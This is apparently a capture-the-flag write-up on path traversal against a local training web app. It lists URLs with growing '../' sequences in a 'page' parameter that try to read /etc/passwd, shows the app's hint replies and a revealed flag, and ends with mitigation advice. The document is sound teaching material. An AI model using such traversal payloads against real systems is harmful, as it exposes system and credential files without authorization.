## [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

Path Traversal occurs when an attacker can manipulate file paths in an application (e.g., through query parameters or user input) to access files or directories outside of the intended directory structure.

The page parameter could be vulnerable to path traversal so we test it and we get a hint that we're on the right track:

http://localhost:8080/index.php?page=../etc/passwd -> `Wtf ?`
http://localhost:8080/index.php?page=../../etc/passwd -> `Wrong..`
http://localhost:8080/index.php?page=../../../etc/passwd -> `Nope..`
http://localhost:8080/index.php?page=../../../../etc/passwd -> `Almost.`
http://localhost:8080/index.php?page=../../../../../etc/passwd -> `Still nope..`
http://localhost:8080/index.php?page=../../../../../../etc/passwd -> `Nope..`
http://localhost:8080/index.php?page=../../../../../../../etc/passwd -> `Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

We could also try absolute paths such as http://localhost:8080/index.php?page=/etc/passwd, but they all return only `Wtf ?`.

Path Traversal is mitigated by:

- Strict Input Validation: only allow expected file paths (whitelist), or reject any sequence containing `..`, `/` or other traversal pattern
- Restricting file access: the server program should only have access to a predefined set of directories
